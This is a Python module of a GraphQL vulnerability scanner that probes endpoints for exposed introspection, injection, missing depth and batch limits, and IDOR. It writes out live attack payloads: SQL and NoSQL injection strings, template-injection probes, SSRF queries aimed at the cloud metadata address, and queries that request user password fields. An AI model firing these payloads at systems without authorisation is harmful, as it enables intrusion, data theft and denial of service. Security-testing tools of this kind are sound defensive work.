"""
Vexor GraphQL Scanner v3.0 - Elite Level
Introspection, injection (SQLi/NoSQLi/SSTI), batching DoS,
depth/complexity limits, field suggestion, IDOR via GraphQL,
subscription abuse, alias overloading, directive injection
"""
import asyncio
import json
import re
from urllib.parse import urlparse, urljoin
from vexor.modules.base import BaseScanner, Finding


GRAPHQL_ENDPOINTS = [
    "/graphql", "/api/graphql", "/graphql/v1", "/v1/graphql",
    "/graphiql", "/playground", "/api", "/query",
    "/gql", "/api/gql", "/graphql/console",
    "/v2/graphql", "/v3/graphql",
]

INTROSPECTION_QUERY = """
{
  __schema {
    queryType { name }
    mutationType { name }
    subscriptionType { name }
    types {
      name
      kind
      description
      fields {
        name
        type { name kind ofType { name kind } }
        args { name type { name } }
      }
      inputFields { name type { name } }
      enumValues { name }
    }
    directives { name locations args { name } }
  }
}
"""

TYPENAME_QUERY = '{ __typename }'

# Injection payloads
SQLI_QUERIES = [
    '{ user(id: "1 OR 1=1") { id name email } }',
    '{ user(id: "1\' OR \'1\'=\'1") { id } }',
    '{ users(filter: "1=1") { id name } }',
    '{ search(query: "\' OR 1=1--") { results } }',
]

NOSQLI_QUERIES = [
    '{ user(id: {$gt: ""}) { id name } }',
    '{ user(filter: {$where: "1==1"}) { id } }',
    '{ users(query: {$regex: ".*"}) { id name } }',
]

SSTI_QUERIES = [
    '{ render(template: "{{7*7}}") { output } }',
    '{ page(name: "${7*7}") { content } }',
]

SSRF_QUERIES = [
    '{ importData(url: "http://169.254.169.254/latest/meta-data/") { data } }',
    '{ fetch(url: "http://127.0.0.1/") { response } }',
    '{ webhook(url: "http://169.254.169.254/") { status } }',
]

IDOR_QUERIES = [
    '{ user(id: 1) { id name email password } }',
    '{ user(id: 2) { id name email } }',
    '{ admin { users { id name email role } } }',
    '{ me { id name email role permissions } }',
]


class Scanner(BaseScanner):
    """GraphQL Scanner v3.0 - Elite Level"""

    MODULE_NAME = "graphql"
    MODULE_DESC = "GraphQL: Introspection/Injection/Batching/Depth/IDOR/Subscription/Alias"

    async def scan(self) -> list[Finding]:
        async with self:
            gql_url = await self._find_graphql_endpoint()
            if not gql_url:
                return self.findings

            await asyncio.gather(
                self._test_introspection(gql_url),
                self._test_injection(gql_url),
                self._test_batching_dos(gql_url),
                self._test_depth_limit(gql_url),
                self._test_complexity_limit(gql_url),
                self._test_idor(gql_url),
                self._test_alias_overloading(gql_url),
                self._test_field_suggestions(gql_url),
                self._test_directive_injection(gql_url),
                return_exceptions=True,
            )
        return self.findings

    async def _find_graphql_endpoint(self) -> str:
        parsed = urlparse(self.target)
        base = f"{parsed.scheme}://{parsed.netloc}"

        for path in GRAPHQL_ENDPOINTS:
            url = base + path
            try:
                resp = await self.post(
                    url,
                    json={"query": TYPENAME_QUERY},
                    headers={"Content-Type": "application/json"},
                )
                if resp and resp.status_code == 200:
                    try:
                        data = resp.json()
                        if "data" in data or "errors" in data:
                            self.add_finding(Finding(
                                severity="INFO",
                                module=self.MODULE_NAME,
                                vuln=f"GraphQL Endpoint Found: {path}",
                                endpoint=url,
                                evidence=f"GraphQL responds at {path}",
                                description="GraphQL endpoint discovered.",
                                remediation="Ensure GraphQL is properly secured.",
                            ))
                            return url
                    except Exception:
                        pass
            except Exception:
                continue
        return ""

    async def _test_introspection(self, url: str) -> None:
        """Test if introspection is enabled and extract schema"""
        resp = await self.post(
            url,
            json={"query": INTROSPECTION_QUERY},
            headers={"Content-Type": "application/json"},
        )
        if not resp or resp.status_code != 200:
            return

        try:
            data = resp.json()
            schema = data.get("data", {}).get("__schema", {})
            if not schema:
                return

            types = schema.get("types", [])
            mutations = schema.get("mutationType")
            subscriptions = schema.get("subscriptionType")

            # Find sensitive types/fields
            sensitive_fields = []
            for t in types:
                if t.get("kind") == "OBJECT":
                    for field in (t.get("fields") or []):
                        fname = field.get("name", "").lower()
                        if any(s in fname for s in ["password", "secret", "token", "key", "admin", "role"]):
                            sensitive_fields.append(f"{t['name']}.{field['name']}")

            evidence = (
                f"Schema exposed: {len(types)} types\n"
                f"Mutations: {'Yes' if mutations else 'No'}\n"
                f"Subscriptions: {'Yes' if subscriptions else 'No'}\n"
            )
            if sensitive_fields:
                evidence += f"Sensitive fields: {', '.join(sensitive_fields[:10])}"

            severity = "HIGH" if sensitive_fields else "MEDIUM"
            self.add_finding(Finding(
                severity=severity,
                module=self.MODULE_NAME,
                vuln="GraphQL Introspection Enabled — Schema Exposed",
                endpoint=url,
                evidence=evidence,
                description=(
                    f"GraphQL introspection exposes full schema ({len(types)} types). "
                    + (f"Sensitive fields found: {', '.join(sensitive_fields[:5])}" if sensitive_fields else "")
                ),
                remediation=(
                    "Disable introspection in production. "
                    "Use field-level authorization. "
                    "Implement query allowlisting."
                ),
            ))
        except Exception:
            pass

    async def _test_injection(self, url: str) -> None:
        """Test for SQLi, NoSQLi, SSTI, SSRF via GraphQL"""
        # SQLi
        for query in SQLI_QUERIES:
            try:
                resp = await self.post(url, json={"query": query}, headers={"Content-Type": "application/json"})
                if resp:
                    text = resp.text.lower()
                    if any(e in text for e in ["sql", "syntax error", "mysql", "postgresql", "sqlite", "ora-"]):
                        self.add_finding(Finding(
                            severity="CRITICAL",
                            module=self.MODULE_NAME,
                            vuln="GraphQL SQL Injection",
                            endpoint=url,
                            payload=query[:100],
                            evidence=f"SQL error in response: {resp.text[:200]}",
                            description="SQL injection via GraphQL argument.",
                            remediation="Use parameterized queries in GraphQL resolvers.",
                        ))
                        break
            except Exception:
                continue

        # NoSQLi
        for query in NOSQLI_QUERIES:
            try:
                resp = await self.post(url, json={"query": query}, headers={"Content-Type": "application/json"})
                if resp and resp.status_code == 200:
                    try:
                        data = resp.json()
                        if data.get("data") and not data.get("errors"):
                            self.add_finding(Finding(
                                severity="HIGH",
                                module=self.MODULE_NAME,
                                vuln="GraphQL NoSQL Injection",
                                endpoint=url,
                                payload=query[:100],
                                evidence=f"Query with NoSQL operator returned data: {resp.text[:200]}",
                                description="NoSQL injection via GraphQL argument.",
                                remediation="Validate and sanitize GraphQL input arguments.",
                            ))
                            break
                    except Exception:
                        pass
            except Exception:
                continue

        # SSRF
        for query in SSRF_QUERIES:
            try:
                resp = await self.post(url, json={"query": query}, headers={"Content-Type": "application/json"})
                if resp and any(s in resp.text for s in ["ami-id", "instance-id", "169.254"]):
                    self.add_finding(Finding(
                        severity="CRITICAL",
                        module=self.MODULE_NAME,
                        vuln="GraphQL SSRF — Cloud Metadata Access",
                        endpoint=url,
                        payload=query[:100],
                        evidence=f"Cloud metadata in response: {resp.text[:200]}",
                        description="SSRF via GraphQL URL argument reaches cloud metadata.",
                        remediation="Validate URLs in GraphQL resolvers. Block internal IPs.",
                    ))
                    break
            except Exception:
                continue

    async def _test_batching_dos(self, url: str) -> None:
        """Test batching attack — DoS and rate limit bypass"""
        # Send 50 queries in one batch
        batch = [{"query": TYPENAME_QUERY}] * 50
        try:
            resp = await self.post(url, json=batch, headers={"Content-Type": "application/json"})
            if resp and resp.status_code == 200:
                try:
                    data = resp.json()
                    if isinstance(data, list) and len(data) >= 10:
                        self.add_finding(Finding(
                            severity="HIGH",
                            module=self.MODULE_NAME,
                            vuln=f"GraphQL Batching — DoS/Rate-Limit Bypass ({len(data)} queries)",
                            endpoint=url,
                            evidence=f"Server processed {len(data)} batched queries in one request",
                            description=(
                                "GraphQL batching allows sending many queries at once. "
                                "Enables DoS attacks and bypasses rate limiting for brute force."
                            ),
                            remediation=(
                                "Limit batch size (max 5-10 queries). "
                                "Implement per-query rate limiting."
                            ),
                        ))
                except Exception:
                    pass
        except Exception:
            pass

    async def _test_depth_limit(self, url: str) -> None:
        """Test query depth limit"""
        # 15-level deep query
        deep = "__typename"
        for _ in range(14):
            deep = f"a {{ {deep} }}"
        deep_query = f"{{ {deep} }}"

        try:
            resp = await self.post(url, json={"query": deep_query}, headers={"Content-Type": "application/json"})
            if resp and resp.status_code == 200:
                try:
                    data = resp.json()
                    if "errors" not in data:
                        self.add_finding(Finding(
                            severity="MEDIUM",
                            module=self.MODULE_NAME,
                            vuln="GraphQL No Query Depth Limit",
                            endpoint=url,
                            evidence="15-level nested query executed without error",
                            description="No depth limit — deeply nested queries can cause DoS.",
                            remediation="Implement query depth limit (max 5-7 levels).",
                        ))
                except Exception:
                    pass
        except Exception:
            pass

    async def _test_complexity_limit(self, url: str) -> None:
        """Test query complexity limit"""
        # High-complexity query with many fields
        complex_query = "{ " + " ".join([f"f{i}: __typename" for i in range(100)]) + " }"
        try:
            resp = await self.post(url, json={"query": complex_query}, headers={"Content-Type": "application/json"})
            if resp and resp.status_code == 200:
                try:
                    data = resp.json()
                    if "errors" not in data:
                        self.add_finding(Finding(
                            severity="MEDIUM",
                            module=self.MODULE_NAME,
                            vuln="GraphQL No Query Complexity Limit",
                            endpoint=url,
                            evidence="100-field query executed without error",
                            description="No complexity limit — expensive queries can cause DoS.",
                            remediation="Implement query complexity analysis and limits.",
                        ))
                except Exception:
                    pass
        except Exception:
            pass

    async def _test_idor(self, url: str) -> None:
        """Test for IDOR via GraphQL queries"""
        for query in IDOR_QUERIES:
            try:
                resp = await self.post(url, json={"query": query}, headers={"Content-Type": "application/json"})
                if resp and resp.status_code == 200:
                    data = resp.json()
                    if data.get("data") and not data.get("errors"):
                        resp_str = json.dumps(data)
                        # Check for sensitive data returned
                        if any(s in resp_str.lower() for s in ["email", "password", "role", "admin", "token"]):
                            self.add_finding(Finding(
                                severity="HIGH",
                                module=self.MODULE_NAME,
                                vuln="GraphQL IDOR — Unauthorized Data Access",
                                endpoint=url,
                                payload=query[:100],
                                evidence=f"Sensitive data returned: {resp_str[:200]}",
                                description="GraphQL query returns sensitive data without authorization.",
                                remediation=(
                                    "Implement field-level authorization. "
                                    "Verify user owns requested resources."
                                ),
                            ))
                            return
            except Exception:
                continue

    async def _test_alias_overloading(self, url: str) -> None:
        """Test alias overloading attack"""
        # 100 aliased queries
        aliases = " ".join([f"q{i}: __typename" for i in range(100)])
        query = f"{{ {aliases} }}"
        try:
            resp = await self.post(url, json={"query": query}, headers={"Content-Type": "application/json"})
            if resp and resp.status_code == 200:
                try:
                    data = resp.json()
                    if data.get("data") and len(data["data"]) >= 50:
                        self.add_finding(Finding(
                            severity="MEDIUM",
                            module=self.MODULE_NAME,
                            vuln="GraphQL Alias Overloading",
                            endpoint=url,
                            evidence=f"100 aliased queries processed in one request",
                            description="Alias overloading can bypass rate limiting and cause DoS.",
                            remediation="Limit number of aliases per query.",
                        ))
                except Exception:
                    pass
        except Exception:
            pass

    async def _test_field_suggestions(self, url: str) -> None:
        """Test if field suggestions reveal schema info"""
        query = '{ userr { id } }'  # Typo to trigger suggestion
        try:
            resp = await self.post(url, json={"query": query}, headers={"Content-Type": "application/json"})
            if resp:
                text = resp.text
                if "Did you mean" in text or "suggestion" in text.lower():
                    self.add_finding(Finding(
                        severity="LOW",
                        module=self.MODULE_NAME,
                        vuln="GraphQL Field Suggestions Enabled",
                        endpoint=url,
                        evidence=f"Suggestion in error: {text[:200]}",
                        description="GraphQL reveals field names via suggestions — schema enumeration possible.",
                        remediation="Disable field suggestions in production.",
                    ))
        except Exception:
            pass

    async def _test_directive_injection(self, url: str) -> None:
        """Test for directive injection"""
        queries = [
            '{ __typename @deprecated(reason: "test") }',
            '{ __typename @skip(if: false) }',
            '{ __typename @include(if: true) }',
        ]
        for query in queries:
            try:
                resp = await self.post(url, json={"query": query}, headers={"Content-Type": "application/json"})
                if resp and resp.status_code == 200:
                    data = resp.json()
                    if data.get("data") and not data.get("errors"):
                        self.add_finding(Finding(
                            severity="INFO",
                            module=self.MODULE_NAME,
                            vuln="GraphQL Directives Accepted",
                            endpoint=url,
                            evidence=f"Directive query accepted: {query}",
                            description="GraphQL accepts directives — test for directive injection.",
                            remediation="Validate and restrict allowed directives.",
                        ))
                        return
            except Exception:
                continue
